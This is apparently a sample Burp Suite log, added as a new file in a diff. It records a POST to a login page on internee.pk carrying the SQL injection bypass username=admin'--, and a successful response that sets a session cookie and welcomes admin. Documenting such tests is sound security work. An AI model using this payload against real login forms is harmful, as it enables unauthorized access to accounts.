@@ -1,0 +1,13 @@
+# Burp Suite Log - Sample
+Request:
+POST /login HTTP/1.1
+Host: internee.pk
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+
+username=admin'--&password=123
+
+Response:
+HTTP/1.1 200 OK
+Set-Cookie: sessionid=abcd1234
+Welcome, admin!
